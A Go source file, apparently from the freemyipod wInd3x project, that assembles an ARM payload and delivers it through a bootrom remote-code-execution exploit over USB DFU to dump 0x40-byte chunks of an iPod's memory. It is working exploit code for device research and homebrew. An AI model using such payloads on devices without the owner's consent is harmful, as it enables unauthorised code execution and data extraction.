package dumpmem

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/google/gousb"
	"github.com/keystone-engine/keystone/bindings/go/keystone"

	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/exploit"
)

// Payload creates a payload which:
// - loads 32 bits from the DFU buffer and interprets is as a src addr
// - loads 0x40 bytes from the src addr and copies them to the DFU
//   buffer
func Payload(ep *exploit.Parameters) ([]byte, error) {
	ks, err := keystone.New(keystone.ARCH_ARM, keystone.MODE_ARM)
	if err != nil {
		return nil, fmt.Errorf("could not create assembler: %w", err)
	}
	payload, _, ok := ks.Assemble(fmt.Sprintf(`
		start:
			# Load offset 
			ldr r0, =0x%x
			ldr r1, [r0]
			mov r2, #00

			# Copy 0x40 bytes from r1 to r0.
		loop:
			ldrb r3, [r1]
			strb r3, [r0]
			add r0, r0, 1
			add r1, r1, 1
			add r2, r2, 1
			cmp r2, #0x40
			bne loop

			# Fixup LR (after trampoline blx messes it up)
			ldr lr, =0x%x
			bx lr
	`, ep.DFUBufAddr, ep.ReturnAddr), uint64(ep.ExecAddr))

	if !ok {
		return nil, fmt.Errorf("failed to assemble payload: %s", ks.LastError())
	}

	return payload, nil
}

func Trigger(usb *gousb.Device, ep *exploit.Parameters, addr uint32) ([]byte, error) {
	if err := dfu.Clean(usb); err != nil {
		return nil, fmt.Errorf("clean failed: %w", err)
	}
	payload, err := Payload(ep)
	if err != nil {
		return nil, fmt.Errorf("failed to generate payload: %w", err)
	}

	addrBuf := bytes.NewBuffer(nil)
	binary.Write(addrBuf, binary.LittleEndian, addr)
	if err := exploit.RCE(usb, ep, payload, addrBuf.Bytes()); err != nil {
		return nil, fmt.Errorf("failed to execute dump payload: %w", err)
	}

	resBuf := make([]byte, 0x40)
	n, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, resBuf)
	if err != nil {
		return nil, fmt.Errorf("failed to read data: %w", err)
	}
	if n != 0x40 {
		return nil, fmt.Errorf("only got %x bytes", n)
	}

	return resBuf, nil
}
